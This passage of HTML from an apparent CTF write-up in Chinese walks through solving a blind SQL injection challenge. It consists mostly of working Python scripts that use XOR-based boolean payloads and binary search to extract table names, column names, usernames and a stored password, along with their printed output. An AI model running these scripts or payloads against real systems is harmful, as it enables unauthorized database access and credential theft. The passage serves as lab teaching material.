class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br></pre></td><td class="code"><pre><code class="hljs py"><span class="hljs-keyword">import</span> requests<br><span class="hljs-keyword">import</span> time<br><br><span class="hljs-comment"># url是随时更新的，具体的以做题时候的为准</span><br><br><span class="hljs-comment"># 登录dvwa的header:</span><br><span class="hljs-comment"># headers = &#123;&#x27;Cookie&#x27;:&#x27;security=low; PHPSESSID=942m2p5g9t4uicc61v7o3gedd7&#x27;,</span><br><span class="hljs-comment">#            &#x27;Referer&#x27;:&#x27;http://localhost/DVWA/vulnerabilities/sqli_blind/&#x27;</span><br><span class="hljs-comment">#            &#125;</span><br><br><span class="hljs-comment"># 当前注入点的url传输格式:</span><br><span class="hljs-comment"># ?id=1&#x27;+and+ascii(substr((select+table_name+from+information_schema.tables+where+table_schema%3Ddatabase()+limit+0%2C1)%2C1%2C1))&gt;102+%23&amp;Submit=Submit#</span><br><br>url = <span class="hljs-string">&#x27;http://6650aff8-185f-482d-8fa4-8cede14a9697.node4.buuoj.cn:81/search.php?id=&#x27;</span><br><span class="hljs-comment"># table_len存储每张表的长度</span><br>table_len = [<span class="hljs-number">30</span>, <span class="hljs-number">30</span>, <span class="hljs-number">30</span>, <span class="hljs-number">30</span>, <span class="hljs-number">30</span>, <span class="hljs-number">30</span>, <span class="hljs-number">30</span>, <span class="hljs-number">30</span>, <span class="hljs-number">30</span>, <span class="hljs-number">30</span>]<br><span class="hljs-comment"># table_name存储每张表的名字</span><br>table_name = []<br><span class="hljs-comment"># index存储现在处理的是第index+1张表</span><br>index = <span class="hljs-number">0</span><br><span class="hljs-comment"># 由于获取的是所有表名总字符串，所以只要遍历一次即可</span><br><span class="hljs-keyword">while</span> (index &lt; <span class="hljs-number">1</span>):<br>    name = <span class="hljs-string">&quot;&quot;</span><br>    <span class="hljs-comment"># n表示当前处理的表所处理的是第n个字符</span><br>    n = <span class="hljs-number">1</span><br>    <span class="hljs-keyword">while</span> (n &lt;= table_len[index]):<br>        <span class="hljs-comment"># 从可打印字符开始</span><br>        begin = <span class="hljs-number">32</span><br>        end = <span class="hljs-number">126</span><br>        tmp = (begin + end) // <span class="hljs-number">2</span><br>        <span class="hljs-comment"># 对第n个字符进行判断</span><br>        <span class="hljs-keyword">while</span> (begin &lt; end):<br>            <span class="hljs-comment"># 根据当前网页url传输格式构造payload</span><br>            <span class="hljs-comment"># payload1:用于普通盲注</span><br>            <span class="hljs-comment"># payload1 = &quot;1&#x27;+and+ascii(substr((select+table_name+from+information_schema.tables+where+table_schema%3Ddatabase()+limit+&#123;&#125;%2C1)%2C&#123;&#125;%2C1))&gt;&#123;&#125;+%23&quot;.format(index, n, tmp)</span><br>            payload2 = <span class="hljs-string">&quot;1^(ascii(substr((select(GROUP_CONCAT(TABLE_NAME))from(information_schema.tables)where(TABLE_SCHEMA=database())),&#123;&#125;,1))&gt;&#123;&#125;)&quot;</span>.<span class="hljs-built_in">format</span>(n, tmp)<br>            <span class="hljs-comment"># 构造url请求,并存储返回的网页响应结果</span><br>            <span class="hljs-comment"># str = &quot;&amp;Submit=Submit#&quot; # 用于补全网页的url</span><br>            <span class="hljs-comment"># print(url + payload1 + str)</span><br>            r = requests.get(url + payload2)<br>            <span class="hljs-comment"># 判断该payload所返回的网页是true界面还是false界面</span><br>            true_text = <span class="hljs-string">&quot;ERROR&quot;</span><br>            <span class="hljs-comment"># print(r.text)</span><br>            <span class="hljs-keyword">if</span> (true_text <span class="hljs-keyword">in</span> r.text):<br>                <span class="hljs-comment"># 返回true界面 </span><br>                begin = tmp + <span class="hljs-number">1</span><br>                tmp = (begin + end) // <span class="hljs-number">2</span><br>            <span class="hljs-keyword">else</span>:<br>                <span class="hljs-comment"># 返回flase界面</span><br>                end = tmp<br>                tmp = (begin + end) // <span class="hljs-number">2</span><br>        <span class="hljs-comment"># 最终begin==end,而此时的tmp就是该字符的ascii码</span><br>        name = name + <span class="hljs-built_in">chr</span>(tmp)<br>        <span class="hljs-comment"># 继续下一个字符</span><br>        n = n + <span class="hljs-number">1</span><br>    <span class="hljs-comment"># 存储该表的表名</span><br>    table_name.append(name)<br>    <span class="hljs-comment"># 打印该表的表名</span><br>    <span class="hljs-built_in">print</span>(<span class="hljs-string">&quot;第&#123;&#125;张表的名字为&#123;&#125;&quot;</span>.<span class="hljs-built_in">format</span>(index+<span class="hljs-number">1</span>, name))<br>    <span class="hljs-comment"># 继续下一个表</span><br>    index = index + <span class="hljs-number">1</span><br><span class="hljs-built_in">print</span>(table_name)<br></code></pre></td></tr></table></figure><p>输出:</p><figure class="highlight txt"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><code class="hljs txt">第1张表的名字为F1naI1y,<br>[&#x27;F1naI1y,                      &#x27;]<br></code></pre></td></tr></table></figure><p>所以得到只有表:F1naI1y</p><p>第四步：直接爆表的字段名,手动规定字段名总长50，使用GROUP_CONCAT()将该张表的所有字段名组合在一起</p><p>payload:</p><figure class="highlight txt"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs txt">?id=1^(ascii(substr((select(GROUP_CONCAT(COLUMN_NAME))from(information_schema.COLUMNS)where(TABLE_NAME=&#x27;F1naI1y&#x27;)),&#123;&#125;,1))&gt;&#123;&#125;)<br></code></pre></td></tr></table></figure><figure class="highlight py"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br><span class="line">73</span><br><span class="line">74</span><br><span class="line">75</span><br><span class="line">76</span><br><span class="line">77</span><br><span class="line">78</span><br><span class="line">79</span><br><span class="line">80</span><br><span class="line">81</span><br><span class="line">82</span><br><span class="line">83</span><br><span class="line">84</span><br><span class="line">85</span><br><span class="line">86</span><br><span class="line">87</span><br></pre></td><td class="code"><pre><code class="hljs py"><span class="hljs-keyword">import</span> requests<br><span class="hljs-keyword">import</span> time<br><br><span class="hljs-comment"># url是随时更新的，具体的以做题时候的为准</span><br><br><span class="hljs-comment"># 登录dvwa的header:</span><br><span class="hljs-comment"># headers = &#123;&#x27;Cookie&#x27;:&#x27;security=low; PHPSESSID=942m2p5g9t4uicc61v7o3gedd7&#x27;,</span><br><span class="hljs-comment">#            &#x27;Referer&#x27;:&#x27;http://localhost/DVWA/vulnerabilities/sqli_blind/&#x27;</span><br><span class="hljs-comment">#            &#125;</span><br><br><span class="hljs-comment"># 当前注入点的url传输格式:</span><br><span class="hljs-comment"># ?id=1&#x27;+and+ascii(substr((select+column_name+from+information_schema.columns+where+table_name%3D+&#x27;users&#x27;+limit+0%2C1)%2C1%2C1))%3D117+%23</span><br><br>url = <span class="hljs-string">&#x27;http://6650aff8-185f-482d-8fa4-8cede14a9697.node4.buuoj.cn:81/search.php?id=&#x27;</span><br><br><span class="hljs-comment"># table_col_num存储每张表每个字段所对应的长度</span><br>table_col_num = &#123;<span class="hljs-string">&#x27;F1naI1y第1字段的长度&#x27;</span>: <span class="hljs-number">50</span>&#125;<br><span class="hljs-comment"># table_name存储每张表的名字</span><br>table_name = [<span class="hljs-string">&#x27;F1naI1y&#x27;</span>]<br><span class="hljs-comment"># col_count存储每张表的字段数</span><br><span class="hljs-comment"># 将所有字段合在一起输出就是只有一个字段</span><br>col_count = &#123;<span class="hljs-string">&#x27;F1naI1y&#x27;</span>: <span class="hljs-number">1</span>&#125;<br><span class="hljs-comment"># table_col_name存储每张表的字段的名字</span><br>table_col_name = &#123;&#125;<br><br>table_num = <span class="hljs-built_in">len</span>(table_name)<br>table_index = <span class="hljs-number">0</span><br><span class="hljs-comment"># 先对表进行遍历,只有表F1naI1y</span><br><span class="hljs-keyword">while</span> (table_index &lt; <span class="hljs-number">1</span>):<br>    <span class="hljs-comment"># 当前表的名字:table_name[table_index]</span><br>    <span class="hljs-comment"># col_num存储当前表的字段数</span><br>    col_num = col_count[table_name[table_index]]<br>    col_index = <span class="hljs-number">0</span><br>    <span class="hljs-comment"># 对当前表的字段进行遍历，获取全部字段名，所以只有一个字段</span><br>    <span class="hljs-keyword">while</span> (col_index &lt; <span class="hljs-number">1</span>):<br>        <span class="hljs-comment"># table_col_key存储当前表当前字段的key</span><br>        key = <span class="hljs-string">&quot;&#123;&#125;第&#123;&#125;字段的长度&quot;</span>.<span class="hljs-built_in">format</span>(table_name[table_index], col_index+<span class="hljs-number">1</span>)<br>        <span class="hljs-comment"># col_len存储当前字段的长度</span><br>        col_len = table_col_num[key]<br>        <span class="hljs-comment"># 遍历当前字段</span><br>        col_len_index = <span class="hljs-number">0</span><br>        <span class="hljs-comment"># name存储当前字段的名称</span><br>        name = <span class="hljs-string">&quot;&quot;</span><br>        <span class="hljs-keyword">while</span> (col_len_index &lt; col_len):<br>            <span class="hljs-comment"># 用二分法对当前字段进行猜解</span><br>            <span class="hljs-comment"># 从可打印字符开始</span><br>            begin = <span class="hljs-number">32</span><br>            end = <span class="hljs-number">126</span><br>            tmp = (begin + end) // <span class="hljs-number">2</span><br>            <span class="hljs-comment"># 对第n个字符进行判断</span><br>            <span class="hljs-keyword">while</span> (begin &lt; end):<br>                <span class="hljs-comment"># 根据当前网页url传输格式构造payload</span><br>                <span class="hljs-comment"># payload1:用于普通盲注</span><br>                <span class="hljs-comment"># payload1 = &quot;1&#x27;+and+ascii(substr((select+column_name+from+information_schema.columns+where+table_name%3D+&#x27;&#123;&#125;&#x27;+limit+&#123;&#125;%2C1)%2C&#123;&#125;%2C1))&gt;&#123;&#125;+%23&quot;.format(table_name[table_index], col_index, col_len_index+1, tmp)</span><br>                payload2 = <span class="hljs-string">&quot;1^(ascii(substr((select(GROUP_CONCAT(COLUMN_NAME))from(information_schema.COLUMNS)where(TABLE_NAME=&#x27;F1naI1y&#x27;)),&#123;&#125;,1))&gt;&#123;&#125;)&quot;</span>.<span class="hljs-built_in">format</span>(col_len_index+<span class="hljs-number">1</span>, tmp)<br>                <span class="hljs-comment"># print(table_name[table_index], col_index, col_len_index, tmp)</span><br>                <span class="hljs-comment"># 构造url请求,并存储返回的网页响应结果</span><br>                <span class="hljs-comment"># str = &quot;&amp;Submit=Submit#&quot; # 用于补全网页的url</span><br>                <span class="hljs-comment"># print(url + payload1 + str)</span><br>                r = requests.get(url + payload2)<br>                time.sleep(<span class="hljs-number">0.1</span>)<br>                <span class="hljs-comment"># 判断该payload所返回的网页是true界面还是false界面</span><br>                true_text = <span class="hljs-string">&quot;ERROR&quot;</span><br>                <span class="hljs-comment"># print(r.text)</span><br>                <span class="hljs-keyword">if</span> (true_text <span class="hljs-keyword">in</span> r.text):<br>                    <span class="hljs-comment"># 返回true界面 </span><br>                    <span class="hljs-comment"># print(&quot;true&quot;)</span><br>                    begin = tmp + <span class="hljs-number">1</span><br>                    tmp = (begin + end) // <span class="hljs-number">2</span><br>                <span class="hljs-keyword">else</span>:<br>                    <span class="hljs-comment"># 返回flase界面</span><br>                    end = tmp<br>                    tmp = (begin + end) // <span class="hljs-number">2</span><br>            <span class="hljs-comment"># 最终begin==end,而此时的tmp就是该字符的ascii码</span><br>            <span class="hljs-comment"># print(tmp)</span><br>            name = name + <span class="hljs-built_in">chr</span>(tmp)<br>            <span class="hljs-comment"># 继续下一个字符</span><br>            col_len_index = col_len_index + <span class="hljs-number">1</span><br>        <span class="hljs-comment"># 存储当前字段的名称:</span><br>        key_name = <span class="hljs-string">&quot;&#123;&#125;的第&#123;&#125;个字段的名字&quot;</span>.<span class="hljs-built_in">format</span>(table_name[table_index], col_index+<span class="hljs-number">1</span>)<br>        table_col_name[key_name] = name<br>        <span class="hljs-built_in">print</span>(<span class="hljs-string">&quot;&#123;&#125;:&#123;&#125;&quot;</span>.<span class="hljs-built_in">format</span>(key_name, name))<br>        <span class="hljs-comment"># 继续下一个字段</span><br>        col_index = col_index + <span class="hljs-number">1</span><br>    <span class="hljs-comment"># 继续下一张表</span><br>    table_index = table_index + <span class="hljs-number">1</span><br><span class="hljs-built_in">print</span>(table_col_name)<br></code></pre></td></tr></table></figure><p>输出:</p><figure class="highlight txt"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><code class="hljs txt">F1naI1y的第1个字段的名字:id,username,password<br>&#123;&#x27;F1naI1y的第1个字段的名字&#x27;: &#x27;id,username,password                              &#x27;&#125;<br></code></pre></td></tr></table></figure><p>第五步：爆字段的数据:</p><p>爆username的数据:</p><p>payload:</p><figure class="highlight txt"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs txt">?id=1^(ascii(substr((select(GROUP_CONCAT(&#123;&#125;))from(&#123;&#125;)),&#123;&#125;,1))&gt;&#123;&#125;)<br></code></pre></td></tr></table></figure><p>测试:</p><p><img src="/images/2023-8-28-FinalSQL/image-20230828134250862-1693214990370-12.png" alt="image-20230828134250862"></p><figure class="highlight py"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br><span class="line">73</span><br></pre></td><td class="code"><pre><code class="hljs py"><span class="hljs-keyword">import</span> requests<br><span class="hljs-keyword">import</span> time<br><br><span class="hljs-comment"># url是随时更新的，具体的以做题时候的为准</span><br><br><span class="hljs-comment"># 登录dvwa的header:</span><br><span class="hljs-comment"># headers = &#123;&#x27;Cookie&#x27;:&#x27;security=low; PHPSESSID=942m2p5g9t4uicc61v7o3gedd7&#x27;,</span><br><span class="hljs-comment">#            &#x27;Referer&#x27;:&#x27;http://localhost/DVWA/vulnerabilities/sqli_blind/&#x27;</span><br><span class="hljs-comment">#            &#125;</span><br><br><span class="hljs-comment"># 当前注入点的url传输格式:</span><br><span class="hljs-comment"># ?id=1&#x27;+and+ascii(substr((select+user+from+dvwa.users+limit+0%2C1)%2C1%2C1))%3D110+%23</span><br><br>url = <span class="hljs-string">&#x27;http://6650aff8-185f-482d-8fa4-8cede14a9697.node4.buuoj.cn:81/search.php?id=&#x27;</span><br><br><span class="hljs-comment"># database_name存储数据库名字</span><br>database_name = <span class="hljs-string">&quot;geek&quot;</span><br><span class="hljs-comment"># table_name存储指定表的名字</span><br>table_name = <span class="hljs-string">&quot;F1naI1y&quot;</span><br><span class="hljs-comment"># col_name存储指定字段的名字</span><br>col_name = <span class="hljs-string">&quot;username&quot;</span><br><span class="hljs-comment"># col_data_num存储有多少列</span><br><span class="hljs-comment"># 手动指定要查看多少列数据，由于合在一起显示所以只有一列</span><br>col_data_num = <span class="hljs-number">1</span><br><span class="hljs-comment"># col_data_charnum存储每个字段数据的字符个数</span><br><span class="hljs-comment"># 手动指定要查看多少字符数据</span><br>col_data_charnum = <span class="hljs-number">100</span><br><br>rank_index = <span class="hljs-number">0</span><br><span class="hljs-comment"># 先遍历该字段有多少列</span><br><span class="hljs-keyword">while</span> (rank_index &lt; col_data_num):<br>    rank_data_index = <span class="hljs-number">0</span><br>    <span class="hljs-comment"># data用来字段该列的数据</span><br>    data = <span class="hljs-string">&quot;&quot;</span><br>    <span class="hljs-keyword">while</span> (rank_data_index &lt; col_data_charnum):<br>        <span class="hljs-comment"># 用二分法对当前字段进行猜解</span><br>        <span class="hljs-comment"># 从可打印字符开始</span><br>        begin = <span class="hljs-number">32</span><br>        end = <span class="hljs-number">126</span><br>        tmp = (begin + end) // <span class="hljs-number">2</span><br>        <span class="hljs-comment"># 对第n个字符进行判断</span><br>        <span class="hljs-keyword">while</span> (begin &lt; end):<br>            <span class="hljs-comment"># 根据当前网页url传输格式构造payload</span><br>            <span class="hljs-comment"># payload1:用于普通盲注</span><br>            <span class="hljs-comment"># payload1 = &quot;1&#x27;+and+ascii(substr((select+&#123;&#125;+from+&#123;&#125;.&#123;&#125;+limit+&#123;&#125;%2C1)%2C&#123;&#125;%2C1))&gt;&#123;&#125;+%23&quot;.format(col_name, database_name, table_name, rank_index, rank_data_index+1, tmp)</span><br>            payload2 = <span class="hljs-string">&quot;1^(ascii(substr((select(GROUP_CONCAT(&#123;&#125;))from(&#123;&#125;)),&#123;&#125;,1))&gt;&#123;&#125;)&quot;</span>.<span class="hljs-built_in">format</span>(col_name, table_name, rank_data_index+<span class="hljs-number">1</span>, tmp)<br>            <span class="hljs-comment"># print(table_name[table_index], col_index, col_len_index, tmp)</span><br>            <span class="hljs-comment"># 构造url请求,并存储返回的网页响应结果</span><br>            <span class="hljs-comment"># str = &quot;&amp;Submit=Submit#&quot; # 用于补全网页的url</span><br>            <span class="hljs-comment"># print(url + payload1 + str)</span><br>            r = requests.get(url + payload2)<br>            time.sleep(<span class="hljs-number">0.1</span>)<br>            <span class="hljs-comment"># 判断该payload所返回的网页是true界面还是false界面</span><br>            true_text = <span class="hljs-string">&quot;ERROR&quot;</span><br>            <span class="hljs-comment"># print(r.text)</span><br>            <span class="hljs-keyword">if</span> (true_text <span class="hljs-keyword">in</span> r.text):<br>                <span class="hljs-comment"># 返回true界面 </span><br>                <span class="hljs-comment"># print(&quot;true&quot;)</span><br>                begin = tmp + <span class="hljs-number">1</span><br>                tmp = (begin + end) // <span class="hljs-number">2</span><br>            <span class="hljs-keyword">else</span>:<br>                <span class="hljs-comment"># 返回flase界面</span><br>                end = tmp<br>                tmp = (begin + end) // <span class="hljs-number">2</span><br>        <span class="hljs-comment"># 最终begin==end,而此时的tmp就是该字符的ascii码</span><br>        <span class="hljs-comment"># print(tmp)</span><br>        data = data + <span class="hljs-built_in">chr</span>(tmp)<br>        <span class="hljs-comment"># 继续下一个字符</span><br>        rank_data_index = rank_data_index + <span class="hljs-number">1</span><br>    <span class="hljs-comment"># 继续下一列</span><br>    <span class="hljs-built_in">print</span>(<span class="hljs-string">&quot;&#123;&#125;字段第&#123;&#125;列的值:&#123;&#125;&quot;</span>.<span class="hljs-built_in">format</span>(col_name, rank_index + <span class="hljs-number">1</span>, data))<br>    rank_index = rank_index + <span class="hljs-number">1</span><br><br></code></pre></td></tr></table></figure><p>输出:</p><figure class="highlight txt"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs txt">username字段第1列的值:mygod,welcome,site,site,site,site,Syc,finally,flag<br></code></pre></td></tr></table></figure><p>发现有一个flag,猜测flag在username&#x3D;flag所对应的字段password中</p><p>爆password字段的值，指定username&#x3D;flag</p><p>payload:</p><figure class="highlight txt"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs txt">?id=1^(ascii(substr((select(password)from(&#123;&#125;)where(username=&#x27;flag&#x27;)),&#123;&#125;,1))&gt;&#123;&#125;)<br></code></pre></td></tr></table></figure><figure class="highlight py"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br><span class="line">73</span><br><span class="line">74</span><br></pre></td><td class="code"><pre><code class="hljs py"><span class="hljs-keyword">import</span> requests<br><span class="hljs-keyword">import</span> time<br><br><span class="hljs-comment"># url是随时更新的，具体的以做题时候的为准</span><br><br><span class="hljs-comment"># 登录dvwa的header:</span><br><span class="hljs-comment"># headers = &#123;&#x27;Cookie&#x27;:&#x27;security=low; PHPSESSID=942m2p5g9t4uicc61v7o3gedd7&#x27;,</span><br><span class="hljs-comment">#            &#x27;Referer&#x27;:&#x27;http://localhost/DVWA/vulnerabilities/sqli_blind/&#x27;</span><br><span class="hljs-comment">#            &#125;</span><br><br><span class="hljs-comment"># 当前注入点的url传输格式:</span><br><span class="hljs-comment"># ?id=1&#x27;+and+ascii(substr((select+user+from+dvwa.users+limit+0%2C1)%2C1%2C1))%3D110+%23</span><br><br>url = <span class="hljs-string">&#x27;http://6650aff8-185f-482d-8fa4-8cede14a9697.node4.buuoj.cn:81/search.php?id=&#x27;</span><br><br><span class="hljs-comment"># database_name存储数据库名字</span><br>database_name = <span class="hljs-string">&quot;geek&quot;</span><br><span class="hljs-comment"># table_name存储指定表的名字</span><br>table_name = <span class="hljs-string">&quot;F1naI1y&quot;</span><br><span class="hljs-comment"># col_name存储指定字段的名字</span><br>col_name = <span class="hljs-string">&quot;password&quot;</span><br><span class="hljs-comment"># col_data_num存储有多少列</span><br><span class="hljs-comment"># 手动指定要查看多少列数据，由于合在一起显示所以只有一列</span><br>col_data_num = <span class="hljs-number">1</span><br><span class="hljs-comment"># col_data_charnum存储每个字段数据的字符个数</span><br><span class="hljs-comment"># 手动指定要查看多少字符数据</span><br>col_data_charnum = <span class="hljs-number">50</span><br><br>rank_index = <span class="hljs-number">0</span><br><span class="hljs-comment"># 先遍历该字段有多少列</span><br><span class="hljs-keyword">while</span> (rank_index &lt; col_data_num):<br>    rank_data_index = <span class="hljs-number">0</span><br>    <span class="hljs-comment"># data用来字段该列的数据</span><br>    data = <span class="hljs-string">&quot;&quot;</span><br>    <span class="hljs-keyword">while</span> (rank_data_index &lt; col_data_charnum):<br>        <span class="hljs-comment"># 用二分法对当前字段进行猜解</span><br>        <span class="hljs-comment"># 从可打印字符开始</span><br>        begin = <span class="hljs-number">32</span><br>        end = <span class="hljs-number">126</span><br>        tmp = (begin + end) // <span class="hljs-number">2</span><br>        <span class="hljs-comment"># 对第n个字符进行判断</span><br>        <span class="hljs-keyword">while</span> (begin &lt; end):<br>            <span class="hljs-comment"># 根据当前网页url传输格式构造payload</span><br>            <span class="hljs-comment"># payload1:用于普通盲注</span><br>            <span class="hljs-comment"># payload1 = &quot;1&#x27;+and+ascii(substr((select+&#123;&#125;+from+&#123;&#125;.&#123;&#125;+limit+&#123;&#125;%2C1)%2C&#123;&#125;%2C1))&gt;&#123;&#125;+%23&quot;.format(col_name, database_name, table_name, rank_index, rank_data_index+1, tmp)</span><br>            <span class="hljs-comment"># payload2 = &quot;1^(ascii(substr((select(GROUP_CONCAT(&#123;&#125;))from(&#123;&#125;)),&#123;&#125;,1))&gt;&#123;&#125;)&quot;.format(col_name, table_name, rank_data_index+1, tmp)</span><br>            payload3 = <span class="hljs-string">&quot;1^(ascii(substr((select(password)from(&#123;&#125;)where(username=&#x27;flag&#x27;)),&#123;&#125;,1))&gt;&#123;&#125;)&quot;</span>.<span class="hljs-built_in">format</span>(table_name, rank_data_index+<span class="hljs-number">1</span>, tmp)<br>            <span class="hljs-comment"># print(table_name[table_index], col_index, col_len_index, tmp)</span><br>            <span class="hljs-comment"># 构造url请求,并存储返回的网页响应结果</span><br>            <span class="hljs-comment"># str = &quot;&amp;Submit=Submit#&quot; # 用于补全网页的url</span><br>            <span class="hljs-comment"># print(url + payload1 + str)</span><br>            r = requests.get(url + payload3)<br>            time.sleep(<span class="hljs-number">0.1</span>)<br>            <span class="hljs-comment"># 判断该payload所返回的网页是true界面还是false界面</span><br>            true_text = <span class="hljs-string">&quot;ERROR&quot;</span><br>            <span class="hljs-comment"># print(r.text)</span><br>            <span class="hljs-keyword">if</span> (true_text <span class="hljs-keyword">in</span> r.text):<br>                <span class="hljs-comment"># 返回true界面 </span><br>                <span class="hljs-comment"># print(&quot;true&quot;)</span><br>                begin = tmp + <span class="hljs-number">1</span><br>                tmp = (begin + end) // <span class="hljs-number">2</span><br>            <span class="hljs-keyword">else</span>:<br>                <span class="hljs-comment"># 返回flase界面</span><br>                end = tmp<br>                tmp = (begin + end) // <span class="hljs-number">2</span><br>        <span class="hljs-comment"># 最终begin==end,而此时的tmp就是该字符的ascii码</span><br>        <span class="hljs-comment"># print(tmp)</span><br>        data = data + <span class="hljs-built_in">chr</span>(tmp)<br>        <span class="hljs-comment"># 继续下一个字符</span><br>        rank_data_index = rank_data_index + <span class="hljs-number">1</span><br>    <span class="hljs-comment"># 继续下一列</span><br>    <span class="hljs-built_in">print</span>(<span class="hljs-string">&quot;&#123;&#125;字段第&#123;&#125;列的值:&#123;&#125;&quot;</span>.<span class="hljs-built_in">format</span>(col_name, rank_index + <span class="hljs-number">1</span>, data))<br>    rank_index = rank_index + <span class="hljs-number">1</span><br><br></code></pre></td></tr></table></figure><p>输出：</p><figure class="highlight txt"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs 